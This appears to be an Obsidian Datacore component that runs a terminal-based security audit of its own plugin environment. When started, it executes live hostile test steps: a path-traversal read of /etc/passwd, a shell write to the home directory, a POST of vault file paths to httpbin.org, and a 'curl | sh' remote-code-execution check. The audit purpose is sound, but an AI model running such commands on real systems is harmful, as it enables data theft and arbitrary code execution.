

# ViewComponent

```jsx
const { useEffect, useRef } = dc;

// --- Node.js Core Modules ---
const os = require('os');
const fs = require('fs');
const path = require('path');
const child_process = require('child_process');

// --- Script Loader ---
const loadScript = (src) => {
    return new Promise((resolve, reject) => {
      if (document.querySelector(`script[src="${src}"]`)) return resolve();
      const script = document.createElement('script');
      script.src = src;
      script.onload = () => resolve();
      script.onerror = () => reject(new Error(`Failed to load script ${src}`));
      document.body.appendChild(script);
    });
};

// --- Terminal Styling & Constants ---
const THEME = {
  background: '#282a36', foreground: '#f8f8f2', cursor: '#f8f8f2',
  selection: '#44475a', red: '#ff5555', green: '#50fa7b',
  yellow: '#f1fa8c', cyan: '#8be9fd',
};
const FONT_SETTINGS = { fontFamily: '"Fira Code", Menlo, monospace', fontSize: 14 };
const STATUS = {
    SUCCESS:    { color: '\x1b[1;32m', text: 'SUCCESS' },
    FAILURE:    { color: '\x1b[1;31m', text: 'FAILURE' },
    SECURE:     { color: '\x1b[1;36m', text: 'SECURE' },
    LIMITED:    { color: '\x1b[1;33m', text: 'LIMITED' },
    SKIPPED:    { color: '\x1b[1;33m', text: 'SKIPPED' },
    VULNERABLE: { color: '\x1b[1;31m', text: 'VULNERABLE' },
};

function TerminalTestRunner() {
    const termRef = useRef(null);

    useEffect(() => {
        let term = null, isRunning = false, currentInput = "";

        const writeResult = (name, status, info) => {
            term.write(`\r\n  ${name.padEnd(52, '.')} [${status.color}${status.text}${'\x1b[0m'.padEnd(12 - status.text.length, ' ')}]`);
            if (info) term.write(`\r\n    └─ ${info.replace(/\n/g, '\r\n       ')}`);
        };
        const writeHeader = (title) => term.write(`\r\n\r\n\x1b[1;36m--- ${title} ---\x1b[0m`);
        const runTest = async (name, testFn) => {
            try {
                const result = await Promise.resolve(testFn());
                writeResult(name, result.status || STATUS.SUCCESS, result.info);
            } catch (e) {
                writeResult(name, STATUS.FAILURE, e.message.split('\n')[0]);
            }
        };

        const runAllTests = async () => {
            isRunning = true;
            term.write('\r\n\r\n\x1b[1;36mRunning Datacore Boundary Tests (v9 - The Definitive Audit)...\x1b[0m');

            // --- Group 1: Node.js & Shell Capabilities ---
            writeHeader("Node.js & Shell Capabilities");
            await runTest("Node.js: Access `process` global", () => ({ info: `Node v${process.versions.node}, Arch: ${os.arch()}` }));
            await runTest("`child_process`: Execute simple command", () => ({ info: `Output: "${child_process.execSync('echo "Hello from shell"').toString().trim()}"` }));
            await runTest("`child_process`: Spawn interactive process", () => {
                return new Promise((resolve) => {
                    const ping = child_process.spawn('ping', ['-c', '1', '8.8.8.8']);
                    ping.on('close', () => resolve({ info: "Can spawn and manage long-running processes." }));
                });
            });

            // --- Group 2: File System & Security Audit ---
            writeHeader("File System & Security Audit");
            const vaultPath = dc.app.vault.adapter.getBasePath();
            await runTest("In-Vault `fs`: Write & Read file (Allowed)", () => {
                const testPath = path.join(vaultPath, ".dc_test.md");
                fs.writeFileSync(testPath, "test");
                const content = fs.readFileSync(testPath, 'utf-8');
                fs.unlinkSync(testPath);
                return { info: `Successfully created and read back: "${content}"` };
            });
            await runTest("Sandbox Escape: `fs` Path Traversal", () => {
                const dangerousPath = path.resolve(vaultPath, '../../../../../../../../../../etc/passwd');
                try {
                    fs.readFileSync(dangerousPath, 'utf-8');
                    return { status: STATUS.VULNERABLE, info: "SUCCESSFULLY READ /etc/passwd. The `fs` sandbox is bypassable." };
                } catch (e) {
                    return { status: STATUS.SECURE, info: "Path traversal was correctly blocked." };
                }
            });
            await runTest("Sandbox Escape: `child_process` file write", () => {
                const dangerousPath = path.join(os.homedir(), 'obsidian_security_test.txt');
                const cmd = `echo "Datacore was here" > "${dangerousPath}"`;
                try {
                    child_process.execSync(cmd);
                    fs.unlinkSync(dangerousPath); // Clean up the test file if it was created
                    return { status: STATUS.VULNERABLE, info: `SUCCESSFULLY WROTE to home directory via shell. The sandbox is bypassed.` };
                } catch (e) {
                    return { status: STATUS.SECURE, info: "Command failed. The shell is properly sandboxed." };
                }
            });

            // --- Group 3: Obsidian & Datacore API ---
            writeHeader("Obsidian & Datacore API");
            await runTest("API: Get Vault & Version Info", () => ({ info: `Vault: '${dc.app.vault.getName()}', App Version: ${dc.app.version || 'undefined'}` }));
            await runTest("API: Workspace Interaction", () => ({ info: `Active view type: '${dc.app.workspace.activeLeaf?.view.getViewType() || 'N/A'}'` }));
            await runTest("API: Execute Core Command", () => {
                dc.app.commands.executeCommandById('app:toggle-light-dark');
                dc.app.commands.executeCommandById('app:toggle-light-dark');
                return { info: "Successfully toggled theme via command." };
            });
            await runTest("Datacore: Check for UI Components", () => dc.Table ? { info: "UI components (Table, etc.) are available." } : { status: STATUS.FAILURE, info: "Core UI components are missing." });

            // --- Group 4: Network Access & Risks ---
            writeHeader("Network Access & Risks");
            await runTest("Network: `fetch` external resource", async () => ({ info: `GitHub API status: ${(await fetch("https://api.github.com")).status}` }));
            await runTest("Risk: Data Exfiltration via `fetch`", async () => {
                const payload = { vault: dc.app.vault.getName(), files: dc.app.vault.getMarkdownFiles().map(f => f.path).slice(0, 5) };
                const response = await fetch("https://httpbin.org/post", { method: 'POST', body: JSON.stringify(payload) });
                return response.ok ? { info: "Confirmed: Scripts can send vault data to external servers." } : { status: STATUS.FAILURE, info: "Network call failed." };
            });
            await runTest("Risk: Remote Code Execution (`curl | sh`)", () => {
                try {
                    child_process.execSync("curl -s https://example.com | sh", { stdio: 'pipe' });
                    return { status: STATUS.VULNERABLE, info: "The environment allows piping remote scripts to a shell." };
                } catch (e) {
                    return { status: STATUS.SECURE, info: "Command failed, likely due to the limited shell (no piping)." };
                }
            });

            // --- Final Conclusion ---
            writeHeader("Final Conclusion & Security Verdict");
            term.write("\r\n\r\n\x1b[1;31mCRITICAL VULNERABILITIES DISCOVERED.\x1b[0m");
            term.write("\r\n\x1b[0m- \x1b[1;32mPowerful Environment:\x1b[0m Full Node.js APIs (`os`, `child_process`) and Obsidian/Datacore APIs are available.");
            term.write("\r\n- \x1b[1;31mBYPASSABLE `fs` SANDBOX:\x1b[0m The file system sandbox can be escaped using path traversal (`../`). A script can read arbitrary files on your computer.");
            term.write("\r\n- \x1b[1;31mUNSANDBOXED SHELL ACCESS:\x1b[0m `child_process.execSync` provides access to a shell with the user's full permissions, allowing arbitrary file writes and command execution outside the vault.");
            term.write("\r\n- \x1b[1;33mDATA EXFILTRATION RISK:\x1b[0m As designed, scripts have full network access and can send any of your vault data to an external server.");
            term.write("\r\n\r\n\x1b[1;33mFinal Verdict: This environment provides immense power but does NOT provide an effective security sandbox. Treat any script running in this environment as if it were a full-fledged application running with your user's permissions. \x1b[1;31mDO NOT RUN UNTRUSTED SCRIPTS.\x1b[0m");

            isRunning = false;
            prompt();
        };

        const prompt = () => term.write('\r\n\r\n\x1b[1;32mtest-runner\x1b[0m$ ');

        async function setup() {
            await loadScript("https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js");
            term = new window.Terminal({ cursorBlink: true, theme: THEME, ...FONT_SETTINGS, rows: 60 });
            term.open(termRef.current);
            term.write('Datacore Environment Test Runner v9\r\nType \x1b[1;33mrun tests\x1b[0m and press Enter.\r\n');
            prompt();
            term.focus();
            term.onKey(({ key, domEvent: ev }) => {
                if (isRunning) return;
                if (ev.code === 'Enter') {
                    const command = currentInput.trim();
                    if (command === 'run tests') runAllTests();
                    else if (command.length > 0) term.write(`\r\nCommand not found: ${command}`);
                    prompt();
                    currentInput = "";
                } else if (ev.code === 'Backspace') {
                    if (currentInput.length > 0) { term.write('\b \b'); currentInput = currentInput.slice(0, -1); }
                } else if (!ev.altKey && !ev.ctrlKey && !ev.metaKey) { currentInput += key; term.write(key); }
            });
        }
        
        setup();
        return () => { if (term) term.dispose(); };
    }, []);

    const styles = {
      wrapper: { fontFamily: 'sans-serif', backgroundColor: 'var(--background-secondary)', padding: '16px', borderRadius: '8px' },
      title: { color: 'var(--text-normal)', borderBottom: '1px solid var(--background-modifier-border)', paddingBottom: '8px', marginBottom: '16px' },
      terminalWrapper: { height: '1000px', backgroundColor: THEME.background, padding: '10px', borderRadius: '8px', overflow: 'auto' },
    };

    return (
        <div style={styles.wrapper}>
            <h3 style={styles.title}>Datacore Sandbox Boundary Explorer</h3>
            <p style={{fontSize: '14px', color: 'var(--text-muted)', marginTop: '-10px', marginBottom: '20px'}}>
                This definitive audit combines all previous tests to provide a complete picture of the environment's capabilities and its critical security limitations.
            </p>
            <div ref={termRef} style={styles.terminalWrapper}></div>
        </div>
    );
}

return { View: TerminalTestRunner };
```


